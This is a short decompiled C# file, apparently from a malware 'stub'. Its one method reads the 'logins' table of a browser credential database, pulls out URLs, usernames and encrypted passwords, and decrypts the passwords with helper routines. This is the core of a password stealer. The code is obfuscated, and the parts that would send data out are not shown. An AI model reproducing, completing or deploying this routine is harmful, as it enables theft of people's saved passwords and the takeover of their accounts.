using System;
using System.Collections.Generic;

namespace Stub
{
	// Token: 0x02000015 RID: 21
	public sealed class Class21
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00003970 File Offset: 0x00001B70
		public static List<GStruct5> smethod_0(string String_0)
		{
			List<GStruct5> list = new List<GStruct5>();
			List<GStruct5> result;
			try
			{
				Class27 @class = Class28.smethod_0(String_0, "logins");
				if (@class == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < @class.method_1(); i++)
					{
						GStruct5 item = default(GStruct5);
						item.String_0 = Class2.smethod_2(@class.method_0(i, 0));
						item.String_1 = Class2.smethod_2(@class.method_0(i, 3));
						string text = @class.method_0(i, 5);
						if (text != null)
						{
							item.String_2 = Class2.smethod_2(Class2.smethod_4(String_0, text));
							list.Add(item);
						}
					}
					result = list;
				}
			}
			catch
			{
				result = list;
			}
			return result;
		}
	}
}
